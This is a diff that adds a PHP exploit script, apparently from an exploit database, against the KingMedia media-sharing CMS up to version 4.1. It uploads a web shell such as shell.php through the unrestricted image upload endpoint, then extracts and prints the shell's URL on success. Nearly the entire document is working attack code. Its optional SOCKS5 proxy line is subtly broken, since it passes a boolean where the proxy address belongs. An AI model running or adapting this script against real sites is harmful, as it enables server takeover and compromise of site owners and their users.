@@ -1,0 +1,57 @@
+# Exploit Title: KingMedia 4.1 - Remote Code Execution
+# Author: Efren Diaz
+# Exploit Date: 2018-08-15
+# Software: KingMedia
+# Version: 1.x, 2.x, 3.x, 4.1
+# Link: https://codecanyon.net/item/king-media-video-image-upload-and-share/7877877
+# CVE: N/A 
+
+<?php
+// Author: Efren Diaz (elefr3n)
+// https://twitter.com/elefr3n
+
+echo "--------------------------------------------\n";
+echo "KING MEDIA CMS ARBITRARY FILE UPLOAD EXPLOIT\n";
+echo "--------------------------------------------\n";
+
+if (!isset($argv[2]))
+{
+    echo "\nUsage: exploit.php <target> <file> <socks5>\n\n";
+    echo "  -target: http://site.com/... (required)\n";
+    echo "  -file: shell.php (required)\n";
+    echo "  -socks5: 127.0.0.1:1337 (optional)\n\n";
+} else {
+    echo "\nUploading file...\n\n";
+
+    $file = $argv[2];
+    $target = $argv[1];
+
+    $mimeType = image_type_to_mime_type(exif_imagetype($file));
+    $cFile = curl_file_create($file, $mimeType, $file);
+
+    $post = array(
+        'ImageFile'=> $cFile
+    );
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $target);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+    if (isset($argv[3])) {
+        curl_setopt($ch, CURLOPT_PROXY, isset($argv[3]));
+        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+    }
+    $result=curl_exec($ch);
+
+    preg_match_all('/src="(.*)" alt="Resized/i',$result,$uploaded_shell);
+
+    if (isset($uploaded_shell[1][0])) {
+        echo "PWNED ! :D \n\n{$uploaded_shell[1][0]}\n\n";
+    } else {
+        echo "Something was bad... str result:\n{$result}";
+    }
+    curl_close ($ch);
+}
